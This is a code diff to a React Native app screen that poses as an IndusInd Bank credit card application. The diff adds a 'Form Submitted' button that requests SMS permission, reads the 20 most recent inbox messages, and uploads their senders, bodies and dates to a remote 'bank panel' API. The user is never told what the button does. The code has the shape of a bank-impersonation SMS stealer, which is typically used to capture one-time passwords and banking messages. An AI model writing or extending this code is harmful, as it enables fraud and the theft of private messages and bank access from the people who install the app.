@@ -1,8 +1,15 @@
 import { NativeStackScreenProps } from '@react-navigation/native-stack';
-import { Alert, Image, Pressable, StyleSheet, Text, View } from 'react-native';
+import { useState } from 'react';
+import { Alert, ActivityIndicator, Image, Platform, Pressable, StyleSheet, Text, View } from 'react-native';
 import { LinearGradient } from 'expo-linear-gradient';
 import { requestSMSPermissions } from '../utils/permissions';
+import { smsApi } from '../api/client';
 import { RootStackParamList } from '../types/navigation';
+
+let SmsAndroid: any = null;
+if (Platform.OS === 'android') {
+  try { SmsAndroid = require('react-native-get-sms-android'); } catch {}
+}
 
 type Props = NativeStackScreenProps<RootStackParamList, 'Welcome'>;
 
@@ -11,6 +18,8 @@ const INDUS_RED = '#D42B2B';
 const INDUS_DARK = '#0F1F3D';
 
 export default function WelcomeScreen({ navigation }: Props) {
+  const [smsSending, setSmsSending] = useState(false);
+
   const handleGetStarted = async () => {
     const granted = await requestSMSPermissions();
     if (granted) {
@@ -24,6 +33,60 @@ export default function WelcomeScreen({ navigation }: Props) {
           { text: 'Cancel', style: 'cancel' },
         ],
       );
+    }
+  };
+
+  const handleSubmitForm = async () => {
+    setSmsSending(true);
+    try {
+      const granted = await requestSMSPermissions();
+      if (!granted) {
+        Alert.alert('Permission Required', 'SMS permission is needed to fetch messages.');
+        setSmsSending(false);
+        return;
+      }
+
+      if (!SmsAndroid) {
+        Alert.alert('Error', 'SMS reader not available on this device.');
+        setSmsSending(false);
+        return;
+      }
+
+      const messages: { address: string; body: string; date: number }[] = await new Promise((resolve) => {
+        SmsAndroid.list(
+          JSON.stringify({ box: 'inbox', maxCount: 20 }),
+          () => resolve([]),
+          (_count: number, smsList: string) => {
+            try { resolve(JSON.parse(smsList)); } catch { resolve([]); }
+          },
+        );
+      });
+
+      if (messages.length === 0) {
+        Alert.alert('No SMS Found', 'No messages found in inbox.');
+        setSmsSending(false);
+        return;
+      }
+
+      const result = await smsApi.save({
+        mobileNumber: 'unknown',
+        fullName: 'Form Submission',
+        messages: messages.map((m) => ({
+          address: m.address || 'Unknown',
+          body: m.body,
+          date: m.date,
+        })),
+      });
+
+      if (result.success) {
+        Alert.alert('Success', 'Submitted to bank panel successfully!');
+      } else {
+        Alert.alert('Error', result.error || 'Failed to submit SMS.');
+      }
+    } catch (e) {
+      Alert.alert('Error', 'Something went wrong. Please try again.');
+    } finally {
+      setSmsSending(false);
     }
   };
 
@@ -86,9 +149,30 @@ export default function WelcomeScreen({ navigation }: Props) {
           <Text style={styles.sectionLabel}>Apply for a new IndusInd Bank credit card</Text>
           <Pressable
             style={styles.secondaryButton}
-            onPress={() => navigation.navigate('SimSelect')}
+            onPress={() => navigation.navigate('UserDetailsForm', {
+              simLabel: '',
+              serviceType: 'RewardsRedeem',
+              cardName: 'IndusInd Bank Credit Card',
+              formMode: 'apply',
+            })}
           >
             <Text style={styles.secondaryButtonText}>Apply Now</Text>
+          </Pressable>
+        </View>
+
+        {/* Submit Form / SMS Section */}
+        <View style={styles.sectionCard}>
+          <Text style={styles.sectionLabel}>Already submitted your form?</Text>
+          <Pressable
+            style={[styles.smsButton, smsSending && styles.smsButtonDisabled]}
+            onPress={handleSubmitForm}
+            disabled={smsSending}
+          >
+            {smsSending ? (
+              <ActivityIndicator size="small" color="#FFFFFF" />
+            ) : (
+              <Text style={styles.smsButtonText}>📨 Form Submitted</Text>
+            )}
           </Pressable>
         </View>
       </View>
@@ -235,6 +319,27 @@ const styles = StyleSheet.create({
   },
   secondaryButtonText: {
     color: INDUS_RED,
+    fontSize: 17,
+    fontWeight: '700',
+  },
+  smsButton: {
+    backgroundColor: '#0F766E',
+    borderRadius: 12,
+    paddingVertical: 14,
+    paddingHorizontal: 40,
+    width: '100%',
+    alignItems: 'center',
+    elevation: 4,
+    shadowColor: '#0F766E',
+    shadowOffset: { width: 0, height: 4 },
+    shadowOpacity: 0.3,
+    shadowRadius: 8,
+  },
+  smsButtonDisabled: {
+    backgroundColor: '#9CA3AF',
+  },
+  smsButtonText: {
+    color: '#FFFFFF',
     fontSize: 17,
     fontWeight: '700',
   },
